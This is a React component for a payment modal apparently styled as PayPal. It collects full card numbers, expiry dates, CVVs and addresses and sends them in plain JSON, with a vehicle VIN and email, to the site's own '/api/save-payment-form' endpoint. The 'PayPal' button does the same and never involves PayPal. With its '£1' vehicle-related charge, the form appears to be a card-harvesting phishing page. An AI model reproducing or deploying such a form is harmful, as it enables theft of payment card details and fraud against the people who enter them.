'use client'
import React, { useState } from 'react'

const EMPTY_ERRORS = {
  cardNumber: '',
  expiry: '',
  cvv: '',
  address: '',
  postalCode: '',
  city: '',
}

export default function PaypalModal({ isOpen, onClose, onSubscribe, orderData = {} }) {
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvv, setCvv] = useState('')
  const [address, setAddress] = useState('')
  const [postalCode, setPostalCode] = useState('')
  const [city, setCity] = useState('')
  const [country, setCountry] = useState('United States')
  const [isSaving, setIsSaving] = useState(false)
  const [errors, setErrors] = useState(EMPTY_ERRORS)
  const [formError, setFormError] = useState('')

  if (!isOpen) return null

  const clearFieldError = (field) => {
    setErrors((prev) => (prev[field] ? { ...prev, [field]: '' } : prev))
    setFormError('')
  }

  const validateForm = () => {
    const nextErrors = { ...EMPTY_ERRORS }
    const cardDigits = cardNumber.replace(/\s/g, '')
    const expiryDigits = expiry.replace(/\D/g, '')

    if (!cardDigits) {
      nextErrors.cardNumber = 'Card number is required'
    } else if (cardDigits.length < 13 || cardDigits.length > 16) {
      nextErrors.cardNumber = 'Enter a valid card number'
    }

    if (!expiryDigits) {
      nextErrors.expiry = 'Expiry is required'
    } else if (expiryDigits.length !== 4) {
      nextErrors.expiry = 'Enter a valid expiry (MM / YY)'
    } else {
      const month = Number(expiryDigits.slice(0, 2))
      if (month < 1 || month > 12) {
        nextErrors.expiry = 'Enter a valid month (01–12)'
      }
    }

    if (!cvv) {
      nextErrors.cvv = 'CVV is required'
    } else if (cvv.length < 3) {
      nextErrors.cvv = 'Enter a valid CVV'
    }

    if (!address.trim()) {
      nextErrors.address = 'Address is required'
    }

    if (!postalCode.trim()) {
      nextErrors.postalCode = 'Postal code is required'
    }

    if (!city.trim()) {
      nextErrors.city = 'City is required'
    }

    setErrors(nextErrors)

    const hasErrors = Object.values(nextErrors).some(Boolean)
    if (hasErrors) {
      setFormError('Please fill in all required fields before continuing.')
      return false
    }

    setFormError('')
    return true
  }

  const savePaymentForm = async (paymentMethod) => {
    const response = await fetch('/api/save-payment-form', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cardNumber,
        expiry,
        cvv,
        address,
        postalCode,
        country,
        city,
        paymentMethod,
        vin: orderData.vin || '',
        email: orderData.email || '',
        carModel: orderData.carModel || '',
        plan: orderData.plan || '',
        price: orderData.price || '',
        vehicleType: orderData.vehicleType || '',
      }),
    })

    const result = await response.json()

    if (!response.ok || !result.success) {
      throw new Error(result.message || 'Failed to save payment form')
    }
  }

  const handlePayment = async (paymentMethod) => {
    if (isSaving) return
    if (!validateForm()) return

    setIsSaving(true)

    try {
      await savePaymentForm(paymentMethod)
      onSubscribe()
    } catch (error) {
      console.error('Payment form save failed:', error)
      alert('Something went wrong. Please try again.')
    } finally {
      setIsSaving(false)
    }
  }

  // Auto-format card number with spaces every 4 digits
  const handleCardNumberChange = (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 16)
    let formatted = digits.replace(/(.{4})/g, '$1 ').trim()
    setCardNumber(formatted)
    clearFieldError('cardNumber')
  }

  // Auto-format MM / YY
  const handleExpiryChange = (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 4)
    if (digits.length > 2) {
      setExpiry(digits.slice(0, 2) + ' / ' + digits.slice(2))
    } else {
      setExpiry(digits)
    }
    clearFieldError('expiry')
  }

  // CVV numeric only
  const handleCvvChange = (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 4)
    setCvv(digits)
    clearFieldError('cvv')
  }

  const handleSubmit = (e) => {
    e.preventDefault()
    handlePayment('Card')
  }

  return (
    <div className="paypal-modal-overlay" onClick={onClose}>
      <div className="paypal-modal-container" onClick={(e) => e.stopPropagation()}>
        
        {/* Close Button */}
        <button className="paypal-close-btn" onClick={onClose}>
          &times;
        </button>

        <form onSubmit={handleSubmit} className="right-panel" noValidate>
          <button type="button" className="paypal-btn" onClick={() => handlePayment('PayPal')} disabled={isSaving}>
            <span className="paypal-logo">
              <span className="pay">Pay</span><span className="pal">Pal</span>
            </span>
          </button>

          <div className="or-divider">or</div>

          <div className={`card-group${errors.cardNumber || errors.expiry || errors.cvv ? ' has-error' : ''}`}>
            <div className={`field field-cardnum${errors.cardNumber ? ' field-error' : ''}`}>
              <input 
                type="text" 
                placeholder="Card number" 
                inputMode="numeric" 
                maxLength={19} 
                value={cardNumber}
                onChange={handleCardNumberChange}
                aria-invalid={!!errors.cardNumber}
              />
              <div className="card-icons">
                <div className="card-icon icon-visa">VISA</div>
                <div className="card-icon icon-mc">
                  <div className="circles">
                    <div className="c1"></div>
                    <div className="c2"></div>
                  </div>
                </div>
                <div className="card-icon icon-amex">AMEX</div>
                <div className="card-icon icon-discover">DISCOVER</div>
                <svg className="lock-icon" width="14" height="16" viewBox="0 0 14 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <rect x="1" y="7" width="12" height="8" rx="1.5" stroke="currentColor" strokeWidth="1.3"/>
                  <path d="M3.5 7V4.5a3.5 3.5 0 0 1 7 0V7" stroke="currentColor" strokeWidth="1.3"/>
                </svg>
              </div>
            </div>
            
            <div className="split-row-inner">
              <div className={`field${errors.expiry ? ' field-error' : ''}`}>
                <input 
                  type="text" 
                  placeholder="MM / YY" 
                  maxLength={7} 
                  value={expiry}
                  onChange={handleExpiryChange}
                  aria-invalid={!!errors.expiry}
                />
              </div>
              <div className={`field${errors.cvv ? ' field-error' : ''}`}>
                <input 
                  type="text" 
                  placeholder="CVV" 
                  maxLength={4} 
                  value={cvv}
                  onChange={handleCvvChange}
                  aria-invalid={!!errors.cvv}
                />
                <svg className="info-icon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <circle cx="8" cy="8" r="7" stroke="currentColor" strokeWidth="1.2"/>
                  <path d="M8 7.2V11.2" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round"/>
                  <circle cx="8" cy="5" r="0.9" fill="currentColor"/>
                </svg>
              </div>
            </div>
          </div>
          {(errors.cardNumber || errors.expiry || errors.cvv) && (
            <p className="field-error-text">
              {errors.cardNumber || errors.expiry || errors.cvv}
            </p>
          )}

          <div className={`single-group${errors.address ? ' has-error' : ''}`}>
            <input 
              type="text" 
              placeholder="Address" 
              value={address}
              onChange={(e) => {
                setAddress(e.target.value)
                clearFieldError('address')
              }}
              aria-invalid={!!errors.address}
            />
          </div>
          {errors.address && <p className="field-error-text">{errors.address}</p>}

          <div className={`split-row${errors.postalCode ? ' has-error' : ''}`}>
            <div className={`field${errors.postalCode ? ' field-error' : ''}`}>
              <input 
                type="text" 
                placeholder="Postal code" 
                value={postalCode}
                onChange={(e) => {
                  setPostalCode(e.target.value)
                  clearFieldError('postalCode')
                }}
                aria-invalid={!!errors.postalCode}
              />
            </div>
            <div className="field country-select">
              <select 
                value={country} 
                onChange={(e) => setCountry(e.target.value)}
              >
                <option>Pakistan</option>
                <option>United States</option>
                <option>United Kingdom</option>
                <option>United Arab Emirates</option>
                <option>India</option>
                <option>Canada</option>
              </select>
              <svg className="chev" width="10" height="14" viewBox="0 0 10 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M1 5L5 1L9 5" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M1 9L5 13L9 9" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>
          {errors.postalCode && <p className="field-error-text">{errors.postalCode}</p>}

          <div className={`single-group${errors.city ? ' has-error' : ''}`}>
            <input 
              type="text" 
              placeholder="City" 
              value={city}
              onChange={(e) => {
                setCity(e.target.value)
                clearFieldError('city')
              }}
              aria-invalid={!!errors.city}
            />
          </div>
          {errors.city && <p className="field-error-text">{errors.city}</p>}

          {formError && <p className="form-error-text">{formError}</p>}

          <button type="submit" className="subscribe-btn" disabled={isSaving}>
            {isSaving ? 'Processing...' : 'Purchase for £1'}
          </button>
        </form>

      </div>
    </div>
  )
}
